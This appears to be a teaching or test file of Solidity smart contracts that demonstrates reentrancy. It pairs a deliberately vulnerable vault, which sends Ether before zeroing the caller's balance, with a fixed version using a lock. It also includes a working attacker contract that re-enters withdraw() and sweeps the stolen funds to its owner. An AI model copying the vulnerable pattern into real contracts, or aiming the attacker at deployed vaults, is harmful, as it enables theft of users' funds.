// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VulnerableVault {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        require(msg.value > 0, "Must deposit more than 0");
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract SecureVault {
    mapping(address => uint256) public balances;
    bool private locked;
    
    modifier noReentrancy() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() external payable {
        require(msg.value > 0, "Must deposit more than 0");
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() external noReentrancy {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");
        
        balances[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    VulnerableVault public vault;
    uint256 public attackCount;
    
    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH to attack");
        
        vault.deposit{value: msg.value}();
        
        vault.withdraw();
    }
    
    receive() external payable {
        attackCount++;
        
        if (address(vault).balance >= 1 ether && attackCount < 3) {
            vault.withdraw();
        }
    }
    
    function stealFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function getAttackBalance() external view returns (uint256) {
        return address(this).balance;
    }
}